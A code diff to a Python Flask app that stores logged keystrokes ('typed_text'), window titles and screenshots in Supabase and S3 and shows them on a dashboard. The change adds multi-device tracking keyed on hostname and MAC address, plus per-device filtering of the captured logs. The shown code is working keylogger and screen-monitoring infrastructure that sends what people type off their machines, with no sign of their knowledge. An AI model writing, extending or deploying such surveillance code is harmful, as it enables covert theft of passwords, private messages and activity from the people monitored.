@@ -4,6 +4,7 @@ import time
 import socket
 import ctypes
 import threading
+import uuid
 from datetime import datetime
 
 # Try imports for headless server compatibility (Render)
@@ -34,6 +35,34 @@ if SUPABASE_URL and SUPABASE_KEY:
         supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
     except Exception as e:
         print(f"Error initializing Supabase client: {e}")
+
+# Unique device identification helper
+def get_device_id():
+    try:
+        mac = uuid.getnode()
+        mac_hex = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
+        hostname = socket.gethostname()
+        return f"{hostname}_{mac_hex}"
+    except Exception:
+        return socket.gethostname() or "unknown_device"
+
+def register_device():
+    if supabase is None:
+        return
+    device_id = get_device_id()
+    hostname = socket.gethostname() or "Unknown Device"
+    try:
+        supabase.table("devices").upsert({
+            "device_id": device_id,
+            "nickname": hostname,
+            "last_active": "now()"
+        }).execute()
+        print(f"Device successfully registered/updated: {device_id} ({hostname})")
+    except Exception as e:
+        print(f"Failed to register/upsert device in Supabase: {e}")
+
+# Register local device on client startup
+register_device()
 
 # Initialize logs and screenshots directories (kept for fallback / temp storage)
 os.makedirs("logs", exist_ok=True)
@@ -516,6 +545,11 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             </div>
             <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
                 <div class="date-selector-wrapper">
+                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Select Device:</span>
+                    <select id="device-select" class="date-select" onchange="changeDevice(this.value)"></select>
+                    <button onclick="promptRenameDevice()" style="background: none; border: none; color: var(--accent); font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0 0.25rem;" title="Rename Device">Rename</button>
+                </div>
+                <div class="date-selector-wrapper">
                     <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Select Date:</span>
                     <select id="date-select" class="date-select" onchange="changeDate(this.value)"></select>
                 </div>
@@ -581,6 +615,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         let currentTab = 'logs-tab';
         let selectedDate = '';
         let selectedSort = 'asc';
+        let selectedDevice = '';
         
         // Track selected items across updates
         let selectedLogKeys = new Set(); // format: "timestamp||text"
@@ -652,9 +687,72 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             fetchScreenshots();
         }
         
+        async function fetchDevices() {
+            try {
+                const res = await fetch('/api/devices');
+                const devices = await res.json();
+                const select = document.getElementById('device-select');
+                
+                const prevSelection = select.value || selectedDevice;
+                
+                select.innerHTML = '';
+                devices.forEach(dev => {
+                    const option = document.createElement('option');
+                    option.value = dev.device_id;
+                    option.innerText = dev.nickname || dev.device_id;
+                    select.appendChild(option);
+                });
+                
+                if (devices.length > 0) {
+                    if (devices.some(d => d.device_id === prevSelection)) {
+                        selectedDevice = prevSelection;
+                    } else {
+                        selectedDevice = devices[0].device_id;
+                    }
+                    select.value = selectedDevice;
+                }
+            } catch (err) {
+                console.error("Error fetching devices:", err);
+            }
+        }
+        
+        function changeDevice(deviceId) {
+            selectedDevice = deviceId;
+            selectedLogKeys.clear();
+            selectedScreenshotFilenames.clear();
+            fetchDates().then(() => {
+                fetchLogs();
+                fetchScreenshots();
+            });
+        }
+        
+        async function promptRenameDevice() {
+            if (!selectedDevice) return;
+            const select = document.getElementById('device-select');
+            const currentNickname = select.options[select.selectedIndex].text;
+            
+            const newName = prompt("Enter a new nickname for this device:", currentNickname);
+            if (newName === null || newName.trim() === '') return;
+            
+            try {
+                const res = await fetch('/api/devices/rename', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: selectedDevice, nickname: newName.trim() })
+                });
+                if (res.ok) {
+                    await fetchDevices();
+                } else {
+                    alert("Failed to rename device");
+                }
+            } catch (err) {
+                console.error("Error renaming device:", err);
+            }
+        }
+        
         async function fetchDates() {
             try {
-                const res = await fetch('/api/dates');
+                const res = await fetch(`/api/dates?device_id=${selectedDevice}`);
                 const dates = await res.json();
                 const select = document.getElementById('date-select');
                 
@@ -675,6 +773,8 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         selectedDate = dates[0];
                     }
                     select.value = selectedDate;
+                } else {
+                    selectedDate = '';
                 }
             } catch (err) {
                 console.error("Error fetching dates:", err);
@@ -690,9 +790,13 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
         
         async function fetchLogs() {
-            if (!selectedDate) return;
+            if (!selectedDate) {
+                document.getElementById('logs-list').innerHTML = '<div class="no-data">No logs found for this date/device.</div>';
+                document.getElementById('logs-action-bar').style.display = 'none';
+                return;
+            }
             try {
-                const res = await fetch(`/api/logs?date=${selectedDate}`);
+                const res = await fetch(`/api/logs?date=${selectedDate}&device_id=${selectedDevice}`);
                 const data = await res.json();
                 const container = document.getElementById('logs-list');
                 
@@ -701,7 +805,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     actionBar.style.display = 'flex';
                 } else {
                     actionBar.style.display = 'none';
-                    container.innerHTML = '<div class="no-data">Waiting for activity logs...</div>';
+                    container.innerHTML = '<div class="no-data">No activity logs found.</div>';
                     return;
                 }
                 
@@ -750,9 +854,13 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
         
         async function fetchScreenshots() {
-            if (!selectedDate) return;
+            if (!selectedDate) {
+                document.getElementById('screenshots-grid').innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found for this date/device.</div>';
+                document.getElementById('screenshots-action-bar').style.display = 'none';
+                return;
+            }
             try {
-                const res = await fetch(`/api/screenshots?date=${selectedDate}`);
+                const res = await fetch(`/api/screenshots?date=${selectedDate}&device_id=${selectedDevice}`);
                 const data = await res.json();
                 const container = document.getElementById('screenshots-grid');
                 
@@ -761,7 +869,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     actionBar.style.display = 'flex';
                 } else {
                     actionBar.style.display = 'none';
-                    container.innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">Waiting for screenshots...</div>';
+                    container.innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found.</div>';
                     return;
                 }
                 
@@ -992,6 +1100,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         
         // Initial load
         async function init() {
+            await fetchDevices();
             await fetchDates();
             fetchLogs();
             fetchScreenshots();
@@ -1008,6 +1117,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }, 2000);
         
         setInterval(() => {
+            fetchDevices();
             fetchDates();
             if (currentTab === 'logs-tab') {
                 fetchScreenshots();
@@ -1070,14 +1180,49 @@ def index():
 def serve_screenshot(filename):
     return send_from_directory('screenshots', filename)
 
+@app.route('/api/devices')
+def get_devices():
+    if supabase is not None:
+        try:
+            res = supabase.table("devices").select("*").order("nickname").execute()
+            return jsonify(res.data)
+        except Exception as e:
+            print(f"Failed to query devices from Supabase: {e}")
+            
+    # Fallback/local mode
+    device_id = get_device_id()
+    hostname = socket.gethostname() or "Unknown Device"
+    return jsonify([{"device_id": device_id, "nickname": hostname}])
+
+@app.route('/api/devices/rename', methods=['POST'])
+def rename_device():
+    data = request.json
+    device_id = data.get("device_id")
+    nickname = data.get("nickname")
+    if not device_id or not nickname:
+        return jsonify({"error": "Device ID and Nickname required"}), 400
+        
+    if supabase is not None:
+        try:
+            supabase.table("devices").update({"nickname": nickname}).eq("device_id", device_id).execute()
+            return jsonify({"status": "success"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+            
+    return jsonify({"error": "Supabase not connected"}), 400
+
 @app.route('/api/dates')
 def get_available_dates():
     dates = set()
+    device_id = request.args.get("device_id")
     
     # Try querying Supabase
     if supabase is not None:
         try:
-            res = supabase.table("activity_logs").select("created_date").execute()
+            query = supabase.table("activity_logs").select("created_date")
+            if device_id:
+                query = query.eq("device_id", device_id)
+            res = query.execute()
             if res.data:
                 for row in res.data:
                     dates.add(row["created_date"])
@@ -1103,15 +1248,19 @@ def get_available_dates():
 @app.route('/api/logs')
 def get_logs():
     date_str = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
+    device_id = request.args.get("device_id")
     
     # Try querying Supabase
     if supabase is not None:
         try:
-            res = supabase.table("activity_logs") \
+            query = supabase.table("activity_logs") \
                 .select("timestamp, window_title, typed_text, screenshot_url, screenshot_filename") \
-                .eq("created_date", date_str) \
-                .order("timestamp", desc=False) \
-                .execute()
+                .eq("created_date", date_str)
+            
+            if device_id:
+                query = query.eq("device_id", device_id)
+                
+            res = query.order("timestamp", desc=False).execute()
                 
             logs = []
             for row in res.data:
@@ -1132,16 +1281,20 @@ def get_logs():
 @app.route('/api/screenshots')
 def get_screenshots():
     date_str = request.args.get("date", datetime.now().strftime("%Y-%m-%d"))
+    device_id = request.args.get("device_id")
     
     # Try querying Supabase
     if supabase is not None:
         try:
-            res = supabase.table("activity_logs") \
+            query = supabase.table("activity_logs") \
                 .select("timestamp, window_title, screenshot_url, screenshot_filename") \
                 .eq("created_date", date_str) \
-                .not_.is_("screenshot_url", "null") \
-                .order("timestamp", desc=False) \
-                .execute()
+                .not_.is_("screenshot_url", "null")
+                
+            if device_id:
+                query = query.eq("device_id", device_id)
+                
+            res = query.order("timestamp", desc=False).execute()
                 
             screenshot_list = []
             for row in res.data:
@@ -1509,11 +1662,13 @@ def capture_and_upload_screenshot(prefix):
     return screenshot_url, s3_path
 
 def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot_filename=None):
+    device_id = get_device_id()
     # 1. Database logging (if Supabase is initialized)
     if supabase is not None:
         try:
             now_date = datetime.now().strftime("%Y-%m-%d")
             data = {
+                "device_id": device_id,
                 "timestamp": timestamp,
                 "created_date": now_date,
                 "window_title": window_title,
@@ -1533,6 +1688,7 @@ def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot
         
         block = [
             f"--- {timestamp} ---",
+            f"Device ID    : {device_id}",
             f"Active Window: {window_title}",
             f"Typed Text   : {line_str}",
             f"Screenshot   : {screenshot_url if screenshot_url else 'None'}",
